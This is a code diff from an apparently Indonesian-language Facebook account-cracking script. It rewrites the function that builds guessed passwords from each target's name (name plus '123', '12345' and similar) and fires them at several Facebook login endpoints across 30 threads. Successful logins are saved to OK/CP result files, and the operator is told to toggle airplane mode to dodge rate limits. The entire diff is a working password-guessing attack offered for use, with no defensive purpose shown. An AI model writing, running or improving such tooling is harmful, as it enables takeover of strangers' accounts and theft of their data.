@@ -642,43 +642,59 @@ def setting():
   passwrd()
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
-  ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
-  sol().print(mark(ler, style='green'))
-  krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s\nHidupkan/Matikan Mode Pesawat Setiap 5 Menit'%(okc,cpc)
-  cetak(nel(krek, title='CRACK'))
-  with tred(max_workers=30) as pool:
-    for yuzong in id2:
-      idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-      frs = nmf.split(' ')[0]
-      pwv = []
-      if len(nmf)<6:
-        if len(frs)<3:
-          pass
-        else:
-          pwv.append(frs+'123')
-          pwv.append(frs+'12345')
-      else:
-        if len(frs)<3:
-          pwv.append(nmf)
-        else:
-          pwv.append(nmf)
-          pwv.append(frs+'123')
-          pwv.append(frs+'12345')
-      pwv.append('sayang')
-      if 'mobile' in method:
-        pool.submit(crack,idf,pwv)
-      elif 'api' in method:
-        pool.submit(crack2,idf,pwv)
-      else:
-        pool.submit(crack,idf,pwv)
-  print('')
-  tanya = '# INGIN MENGECEK OPSI HASIL CRACK?'
-  sol().print(mark(tanya, style='green'))
-  woi = input(x+'['+p+'f'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
-  if woi in ['y','Y']:
-    cek_opsi()
-  else:
-    exit()
+	print(f'-<<•>>- {m}•{k}•{h}•{x} Sedang Menggeser Matahari {m}•{k}•{h}•{x} -<<•>>- ')
+	print('')
+	print(f'——> Hasil {b}OK{x} Tersimpan Di : {b}OK/%s {x}'%(okc))
+	print(f'——> Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
+	print(f'<•> Mainkan Mode Pesawat Setiap {p}100{x} Idz\n')
+	with tred(max_workers=30) as pool:
+		for yuzong in id2:
+			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+			frs = nmf.split(' ')[0]
+			pwv = []
+			if len(nmf)<6:
+				if len(frs)<3:
+					pass
+				else:
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+			else:
+				if len(frs)<3:
+					pwv.append(nmf)
+				else:
+					pwv.append(nmf)
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'123456')
+			if 'ya' in pwpluss:
+				for xpwd in pwnya:
+					pwv.append(xpwd)
+			else:pass
+			if 'mobile' in method:
+				pool.submit(crack,idf,pwv)
+			elif 'free' in method:
+				pool.submit(crackfree,idf,pwv)
+			elif 'touch' in method:
+				pool.submit(cracktouch,idf,pwv)
+			elif 'mbasic' in method:
+				pool.submit(crackmbasic,idf,pwv)
+			else:
+				pool.submit(crackmbasic,idf,pwv)
+	print('')
+	cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
+	print(f' {b}╰─>{x} {h} OK : {h}%s '%(ok))
+	print(f'{x} {k}╰─>{x} {k} CP : {k}%s{x} '%(cp))
+	print('')
+	print('—> Lanjut Crack Kembali ( Y/t ) ? ')
+	woi = input('—> Pilih : ')
+	if woi in ['y','Y']:
+		back()
+	else:
+		print(f'\t{x}<•>{k} Good Bye {x} <•> ')
+		time.sleep(2)
+		exit()
 #--------------------[ METODE-B-API ]-----------------#
 def crack(idf,pwv):
 	global loop,ok,cp
